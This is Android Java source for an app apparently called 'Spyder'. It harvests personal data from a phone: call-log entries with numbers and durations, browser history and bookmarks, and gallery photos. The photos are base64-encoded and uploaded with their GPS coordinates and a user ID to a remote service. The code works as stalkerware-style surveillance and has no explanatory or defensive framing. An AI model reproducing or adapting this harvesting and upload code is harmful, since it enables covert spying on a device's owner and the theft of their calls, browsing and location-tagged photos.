package com.spyder.app.activitys.util;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Base64;
import android.util.Log;
import android.widget.GridView;
import android.widget.Toast;

import com.bumptech.glide.util.Util;
import com.google.gson.Gson;
import com.spyder.app.activitys.MainActivity;
import com.spyder.app.activitys.presenter.SpyderContract;
import com.spyder.app.activitys.presenter.SpyderPresenter;
import com.spyder.app.activitys.request.CallHistoryDetailsPojo;
import com.spyder.app.activitys.request.PhotoDetail;
import com.spyder.app.activitys.request.UserPhotoDetailList;
import com.spyder.app.activitys.response.BaseContext;
import com.spyder.app.activitys.view.activities.Browser;
import com.spyder.app.activitys.webservices.GPSTrack;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import static com.spyder.app.activitys.MainActivity.REQUEST_PERMISSIONS;

/**
 * Created by srisailampaka on 11/02/18.
 */

public class GetDetailsInformation implements SpyderContract.View {
    public static Context context;
    public static Gson gson = new Gson();
    public static SharedPref sharedPref;
    public static String timeStamp;
    public static SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy hh:mm:ssaa");
    public static String getlangitude, getLattitude;
    public static GPSTrack gpsTrack;
    public static List<PhotoDetail> photoDetailList;
    public static SpyderPresenter mSpyderPresenter;
    public static ArrayList<PhotoDetail> saveGalleryPhotoArrayList = new ArrayList<>();
    public static ArrayList<PhotoDetail> finalGalleryPhotoArrayList = new ArrayList<>();
    public static boolean boolean_folder;
    private static final int REQUEST_PERMISSIONS = 100;
    public GetDetailsInformation(Context applicationContext) {

        context = applicationContext;
        sharedPref = new SharedPref(context);
        gpsTrack = new GPSTrack(context);
        getlangitude = gpsTrack.currentLangitude;
        getLattitude = gpsTrack.currentLattitude;
        timeStamp = simpleDateFormat.format(new Date());
        mSpyderPresenter = new SpyderPresenter(this, context);
    }

    public List<CallHistoryDetailsPojo> getCallHistory() {
        List<CallHistoryDetailsPojo> saveCallHistoryDetailsList = new ArrayList<>();

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.

            String selection= CallLog.Calls.DATE+">"+sharedPref.getOneDayTimestamp();

        Cursor mCursor = context.getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, selection,
                null, null);
        int number = mCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int date = mCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = mCursor.getColumnIndex(CallLog.Calls.DURATION);
        int type = mCursor.getColumnIndex(CallLog.Calls.TYPE);
        StringBuilder sb = new StringBuilder();
        while (mCursor.moveToNext()) {
            String phnumber = mCursor.getString(number);
            String callduration = mCursor.getString(duration);
            String calltype = mCursor.getString(type);
            String calldate = mCursor.getString(date);
            Date d = new Date(Long.valueOf(calldate));
            String callTypeStr = "";
            switch (Integer.parseInt(calltype)) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callTypeStr = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callTypeStr = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callTypeStr = "Missed";
                    break;
            }
            CallHistoryDetailsPojo callhistory=new CallHistoryDetailsPojo();
            callhistory.setUserId(sharedPref.getUserId());
            callhistory.setPhoneNumber(phnumber);
            callhistory.setDuration(callduration);
            callhistory.setTypeOfCall(callTypeStr);
            callhistory.setTimestamp(String.valueOf(d));
            saveCallHistoryDetailsList.add(callhistory);
            MyLog.log("calldataArray......",gson.toJson(saveCallHistoryDetailsList));
        }
     //   MyLog.log("calldata......",sb.toString());
        // textview.setText(sb.toString());


    }
        return saveCallHistoryDetailsList;}
    public  void getBrowserHistory(){
        Browser browser=new Browser();
        Cursor mCur = context.getApplicationContext().getContentResolver().query(browser.BOOKMARKS_URI, browser.HISTORY_PROJECTION, null, null, null);
        String[] proj = new String[] { com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE, com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.URL};
        String sel = com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history, 1 = bookmark
        mCur = context.getApplicationContext().getContentResolver().query(browser.BOOKMARKS_URI, proj, sel, null, null);
       // context.getApplicationContext().getContentResolver().startManagingCursor(mCur);
        mCur.moveToFirst();

        String title = "";
        String url = "";
        if (mCur.moveToFirst() && mCur.getCount() > 0) {
            boolean cont = true;
            while (mCur.isAfterLast() == false && cont) {
                title = mCur.getString(mCur.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE));
                url = mCur.getString(mCur.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.URL));

                // Do something with title and url
                MyLog.log("title....",title);
                MyLog.log("url......",url);
                mCur.moveToNext();
            }
        }
    }
    public  void secondmethodBrowserHistory(){
        Browser browser=new Browser();
        String[] projection = new String[] {
                com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE
                , com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.URL
        };
        Cursor mCur = context.getApplicationContext().getContentResolver().query(browser.BOOKMARKS_URI,
                projection, null, null, null
        );
        mCur.moveToFirst();
        int titleIdx = mCur.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE);
        int urlIdx = mCur.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.URL);
        while (mCur.isAfterLast() == false) {
//            view.append("n" + mCur.getString(titleIdx));
//            view.append("n" + mCur.getString(urlIdx));
            MyLog.log("2methodtitle....",mCur.getString(titleIdx));
            MyLog.log("2methodurl......",mCur.getString(urlIdx));
            mCur.moveToNext();
        }

    }
    public void lastMethodtypegetBrowserdata(){
        Browser browser=new Browser();
// here another one check below code----is useful for us----????????
        String[] requestedColumns = {
                com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE,
                com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.VISITS,
                com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.BOOKMARK
        };

        Cursor faves = context.getApplicationContext().getContentResolver().query(browser.BOOKMARKS_URI, requestedColumns,
                com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.BOOKMARK + "=1", null, com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.VISITS);
        //Log.d(DEBUG_TAG, "Bookmarks count: " + faves.getCount());
        int titleIdx = faves.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE);
        int visitsIdx = faves.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.VISITS);
        int bmIdx = faves.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.BOOKMARK);
        faves.moveToFirst();
        while (!faves.isAfterLast()) {
            Log.d("SimpleBookmarks", faves.getString(bmIdx) + faves.getString(titleIdx) + " visited " + faves.getInt(visitsIdx) + " times : " + (faves.getInt(bmIdx) != 0 ? "true" : "false"));
            faves.moveToNext();
        }
    }




   public  static void getTheAllPhotos(){

        saveGalleryPhotoArrayList.clear();
       String[] columns = { MediaStore.Images.ImageColumns.LATITUDE,
               MediaStore.Images.ImageColumns.LONGITUDE,
               MediaStore.Images.ImageColumns.TITLE,
               MediaStore.Images.ImageColumns.DATA,
               MediaStore.Images.ImageColumns.DATE_TAKEN
       };
       String selection= MediaStore.Images.ImageColumns.DATE_TAKEN+">"+sharedPref.getLastImageTimestamp();

       final String orderBy = MediaStore.Images.ImageColumns.DATE_MODIFIED + " ASC";
       Cursor cursor =  context.getApplicationContext().getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, selection, null, orderBy);

       int count = cursor.getCount();
       String latitude, longitude,time;
       String filePath;
       for (int i = 0; i < count; i++) {
           cursor.moveToPosition(i);
           latitude = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.LATITUDE));
           longitude = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.LONGITUDE));
           time=cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATE_TAKEN));
           filePath = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATA));

           PhotoDetail photoDetail=new PhotoDetail();
           photoDetail.setUserId(sharedPref.getUserId());
           photoDetail.setImage(getBase64Image(filePath));
           photoDetail.setLattitude(latitude + "");
           photoDetail.setLongitude(longitude+"");

           photoDetail.setTimestamp(time);
           saveGalleryPhotoArrayList.add(photoDetail);

           UserPhotoDetailList userPhotoDetailList = new UserPhotoDetailList();
           userPhotoDetailList.setPhotoDetails(saveGalleryPhotoArrayList);
           if(CommonUtil.isNetworkAvailable(context))
           { mSpyderPresenter.savePhotoDetails(userPhotoDetailList);
           sharedPref.setLastImageTimestamp(photoDetail.getTimestamp());
           }else
           {
               break;
           }
           Log.v("srisailam",".."+i);
           saveGalleryPhotoArrayList.clear();
       }


    }

    private static String getBase64Image(String filePath) {

        File imageFile = new File(filePath);
        Bitmap bitmap = BitmapFactory.decodeFile(imageFile.getAbsolutePath());
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.PNG, 90, stream);
        byte[] image = stream.toByteArray();
        String img_str = Base64.encodeToString(image, 0);
        return img_str;
    }
    @Override
    public void successResponse(BaseContext baseContext) {

    }

    @Override
    public void failureResponse(String error) {

    }
}
